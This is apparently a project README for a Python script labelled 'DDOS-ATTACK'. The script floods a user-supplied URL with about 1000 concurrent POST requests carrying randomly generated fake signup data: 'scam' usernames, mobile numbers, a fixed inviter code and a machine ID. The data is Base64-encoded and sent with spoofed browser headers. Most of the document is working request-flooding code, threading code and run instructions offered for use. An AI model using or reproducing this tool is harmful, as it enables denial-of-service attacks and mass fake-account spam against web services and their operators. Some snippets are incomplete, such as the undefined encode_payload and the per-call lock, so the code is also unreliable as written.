# DDOS-ATTACK



This Python script simulates sending multiple POST requests to a target URL with randomly generated payload data. It uses multithreading to send a large number of requests simultaneously.

## Features

- **Random Data Generation**: Generates random usernames and mobile numbers for each request.
- **Multithreading**: Handles concurrent requests using Python's `ThreadPoolExecutor` for efficiency.
- **Data Encoding**: Payload data is both URL-encoded and Base64-encoded before being sent.
- **Custom HTTP Headers**: Each request is sent with specific headers mimicking a real browser request.
- **Progress Tracking**: Displays the number of successful requests in real-time.

## Prerequisites

You need to have Python 3.x installed along with the `requests` library. Install the dependencies using:

```bash
pip install requests
```

## How It Works
Random Username and Mobile Generation: The script generates random usernames (e.g., scamXXXX) and mobile numbers (starting with 98) using the random module.

```bash
def generate_random_username():
    return f"scam{random.randint(1000, 9999)}"

def generate_random_mobile():
    return f"98{random.randint(10000000, 99999999)}"
```
## Payload Creation: 
The generated data is packed into a dictionary and converted to a JSON string. It is then URL-encoded and Base64-encoded for secure transmission.

```bash
def create_payload():
    payload = {
        "username": generate_random_username(),
        "mobile": generate_random_mobile(),
        "password": "scam",
        "inviter": "114563",
        "machine": "17204265160908750676"
    }
    return payload
```
## Request Sending: 
Each request is sent with custom headers and the encoded payload. If the request is successful (HTTP 200), the counter of successful requests is incremented.

```bash
def send_request(session, url):
    global successful_requests
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }
    payload = create_payload()
    encoded_data = encode_payload(payload)
    data = {'data': encoded_data}
    
    response = session.post(url, headers=headers, data=data)
    if response.status_code == 200:
        with threading.Lock():
            successful_requests += 1
            print(f"Request sent successfully {successful_requests}")
    else:
        print(f"Request failed. Response: {response.status_code}")
```
## Multithreading: 
The script uses ThreadPoolExecutor to send multiple requests concurrently.


```bash

def threads(num_threads, url):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        with requests.Session() as session:
            futures = [executor.submit(send_request, session, url) for _ in range(num_threads)]
            for future in futures:
                future.result()

```
Running the Script
Clone or download the project.

## Install dependencies:

```bash

pip install requests
```
Run the script:

```bash

python app.py
```
Enter the target URL when prompted. The script will automatically send 1000 requests concurrently to the URL.

## Example
```bash

Enter the desired URL: https://example.com/api/submit
Request sent successfully 1
Request sent successfully 2
Request sent successfully 3
...
